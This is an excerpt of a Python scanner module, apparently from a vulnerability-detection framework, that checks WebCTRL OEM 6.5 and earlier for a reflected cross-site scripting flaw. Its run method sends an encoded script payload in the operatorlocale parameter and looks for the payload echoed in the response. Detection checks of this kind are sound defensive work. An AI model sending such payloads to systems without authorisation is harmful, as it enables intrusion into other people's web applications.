...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WebCTRL OEM <= 6.5 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'webctrl', 'xss', 'packetstorm', 'automatedlogic', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.jsp?operatorlocale=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"><script>alert(document.domain)</script>', 'common/lvl5',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WebCTRL OEM <= 6.5 - Cross-Site Scripting detected",
                path='/index.jsp?operatorlocale=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False
